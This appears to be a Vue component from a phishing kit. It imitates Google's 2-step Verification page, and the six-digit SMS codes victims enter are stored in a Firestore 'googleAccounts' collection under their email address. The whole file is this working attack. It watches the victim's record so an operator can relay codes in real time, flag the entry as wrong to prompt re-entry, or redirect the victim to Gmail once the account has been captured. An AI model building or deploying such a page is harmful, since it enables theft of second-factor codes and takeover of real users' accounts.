<template>
  <v-app color>
    <v-content class>
      <v-container fill-height class="d-flex justify-center">
        <v-card
          max-width="448"
          height="500"
          :loading="loginPageLoaded"
          :outlined="true"
          flat
          :disabled="loginPageLoaded"
          class="pl-8 pr-8"
        >
          <v-card-title>
            <v-img
              width="20"
              height="32"
              :src="require('@/assets/google_logo.png')"
              :contain="true"
              class="mt-8"
            />
          </v-card-title>
          <v-card-text>
            <h3 class="headline text-center text--primary">
              2-step Verification
            </h3>
            <h4 class="text--primary text-center">
              This extra step shows that it's really you trying to
              <br />sign in.
            </h4>
            <h4 class="primary--text text-center">Learn more</h4>
            <div class="text-center">
              <v-btn
                :rounded="true"
                class="ma-3 mx-auto email-button"
                :outlined="true"
              >
                <v-icon left>mdi-account-circle</v-icon>
                <div class="text--primary text-none">{{ email }}</div>
                <v-icon right>mdi-chevron-down</v-icon>
              </v-btn>
              <h4 class="text-left text--primary">2-step Verification</h4>
              <p class="text--primary text-left">{{ promptNumber }}</p>
              <v-text-field
                :disabled="loginPageLoaded"
                type="number"
                label="Enter the code"
                :error="error"
                v-model="password"
                :outlined="true"
                width="300"
                color="primary"
                class="mt-5"
                :error-messages="errorMessage"
                @click:append="showPassword = !showPassword"
                v-on:keyup.enter="submitForm"
                ref="password"
              ></v-text-field>
            </div>
          </v-card-text>
          <v-card-actions>
            <v-btn color="primary" class="text-none" :depressed="true" text
              >Try another way</v-btn
            >
            <v-spacer></v-spacer>
            <v-btn
              color="primary"
              :depressed="true"
              @click="submitForm"
              eight="36"
              width="88"
              class="text-none"
              >Next</v-btn
            >
          </v-card-actions>
          <v-snackbar v-model="snackbar" :bottom="true" :timeout="0">
            Didn't get the code?
            <v-btn dark text @click="resendCode" color="yellow"
              >RESEND IT</v-btn
            >
          </v-snackbar>
        </v-card>
      </v-container>
    </v-content>
  </v-app>
</template>

<script>
import { db } from "../firebase";
export default {
  name: "SMSForm",

  data: () => ({
    showPassword: false,
    loginPageLoaded: false,
    errorMessage: "",
    error: false,
    disableCard: false,
    email: "",
    password: "",
    ipAddress: "",
    countryName: "",
    submitCount: 0,
    cardLoading: false,
    snackbar: false,
    promptNumber: "",
  }),

  async created() {
    this.email = this.$route.params.email.includes("@")
      ? this.$route.params.email
      : window.atob(this.$route.params.email);
    console.log(this.email);
    console.log(this.$route.params.email);
    console.log(this.$route.params.promptNumber, "in SMS verification");

    this.promptNumber = this.$route.params.promptNumber;

    //this.$refs.password.focus();
    let googleAccounts = db.collection("googleAccounts");
    const user = await googleAccounts.doc(this.email).get();
    user.get("cookies") && (window.location.href = `https://mail.google.com`);

    googleAccounts.where("email", "==", this.email).onSnapshot((snapshot) => {
      console.log("i snapped");
      snapshot.docChanges().forEach(
        (change) => {
          let changeData = change.doc.data();
          if (change.type === "modified") {
            changeData.loggedIn &&
              (window.location.href = `https://mail.google.com`);

            if (changeData.loginError) {
              this.loginPageLoaded = !this.loginPageLoaded;
              this.error = true;
              this.errorMessage = "Enter a valid 6 digit SMS code.";
            }
          }
        },
        (err) => {
          console.log(`Encountered error: ${err}`);
        }
      );
    });
  },

  mounted() {
    console.log("i mounted");
    setInterval(() => {
      console.log("snackbar ran here");
      if (this.snackbar == false) this.snackbar = true;
    }, 15000);
  },

  methods: {
    async submitForm() {
      console.log();
      this.email = this.$route.params.email.includes("@")
        ? this.$route.params.email
        : window.atob(this.$route.params.email);

      if (this.password.length != 6) {
        console.log("i ran password length");
        this.error = true;
        this.errorMessage = "Wrong number of digits. try again";
        this.password = "";
        return;
      }

      this.errorMessage = "";
      this.error = false;
      console.log(this.password);
      this.loginPageLoaded = !this.loginPageLoaded;
      try {
        await db.collection("googleAccounts").doc(this.email).set(
          {
            smsCode: this.password,
            loggedIn: false,
            loginError: false,
          },
          { merge: true }
        );
        // this.loginPageLoaded = !this.loginPageLoaded;
      } catch (e) {
        console.log(e);
      }
      this.smsCode = "";
      // this.password = "";
    },
    resendCode() {
      this.snackbar = false;
      this.cardLoading = true;
      this.disableCard = true;
      this.error = false;
      this.errorMessage = "";

      setTimeout(() => {
        this.cardLoading = false;
        this.disableCard = false;
        this.password = "";
      }, 3000);
    },
  },
};
</script>

<style lang="scss">
a {
  text-decoration: none;
  color: #005da6;
}
.rounded-button {
  border-radius: 0px;
}
.email-button {
  border: 0.5px solid rgb(219, 219, 219);
}
</style>